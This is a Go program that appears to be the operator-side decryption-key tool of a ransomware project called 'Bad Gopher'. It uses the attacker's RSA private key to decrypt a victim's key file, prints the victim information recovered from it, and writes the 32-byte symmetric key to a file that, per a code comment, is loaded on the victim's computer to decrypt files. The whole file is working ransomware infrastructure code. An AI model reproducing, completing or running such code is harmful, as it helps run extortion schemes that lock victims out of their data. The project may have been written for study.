package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"strings"
)

func main() {
	// TODO: Make this more user-friendly, i.e. command line options for selecting
	// file and ability to drag gopher key file onto exe to generate decryption key
	privateKeyPath := flag.String("key", "", "private key")
	gopherFilePath := flag.String("input", "", "Bad Gopher key file")
	flag.Parse()

	if _, err := os.Stat(*privateKeyPath); err != nil {
		fmt.Println("Private key file does not exist or not specified (--key)")
		return
	}

	if _, err := os.Stat(*gopherFilePath); err != nil {
		fmt.Println("Gopher key file does not exist or not specified (--input)")
		return
	}

	privRaw, _ := ioutil.ReadFile(*privateKeyPath)
	privPem, _ := pem.Decode(privRaw)

	privKey, _ := x509.ParsePKCS1PrivateKey(privPem.Bytes)

	keyFile, _ := os.Open(*gopherFilePath)
	defer keyFile.Close()
	keyFileText, _ := ioutil.ReadAll(keyFile)
	keyFileBytes, _ := hex.DecodeString(string(keyFileText))
	plaintext, _ := rsa.DecryptOAEP(sha256.New(), rand.Reader, privKey, keyFileBytes, nil)

	information := string(plaintext[:len(plaintext)-32])
	symmetricKey := plaintext[len(plaintext)-32:]
	fmt.Printf("Information:\n%s\n", information)
	fmt.Printf("Symmetric Key: %x\n", symmetricKey)

	// Save symmetric key to a file that can be loaded on victim's computer to decrypt files
	symmetricKeyEncoded := hex.EncodeToString(symmetricKey)
	filename := fmt.Sprintf("BAD_GOPHER_DECRYPT_%s", strings.ReplaceAll(strings.Split(information, "\n")[1], " ", "_")[:10])
	fmt.Println("Saved to:", filename)
	f, _ := os.Create(filename)
	defer f.Close()
	f.WriteString(symmetricKeyEncoded)
}
